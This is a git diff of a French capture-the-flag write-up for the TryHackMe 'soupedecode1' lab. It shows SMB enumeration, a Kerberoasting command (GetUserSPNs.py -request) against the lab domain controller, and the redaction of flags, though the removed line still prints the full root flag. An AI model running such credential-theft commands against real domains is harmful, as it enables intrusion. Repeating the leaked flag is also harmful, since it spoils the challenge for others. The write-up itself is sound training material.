@@ -175,7 +175,7 @@ SMB         10.81.133.107   445    DC01             [+] SOUPEDECODE.LOCAL\ybob31
 on va maintenant explorer le protocol smb via smbclient 
 
 et on a trouvé la flag sur le Desktop
-
+[REDACTED]
 on va maintenant faire du kerberoasting avec spn
 ┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
 └─$ GetUserSPNs.py -request soupedecode.local/ybob317 -dc-ip 10.81.133.107 -outputfile roasted.txt
@@ -283,7 +283,7 @@ smb: \> ls
 
 ┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
 └─$ cat root.txt                                                     39s
-27cb2be302c388d63d27c86bfdd5f56a
+27cb2[REDACTED]dd5f56a
 
 ┌────(bojack@bojack-hostman)-[~/Bureau/tryhackme/soupedecode1][main] 
 └─$
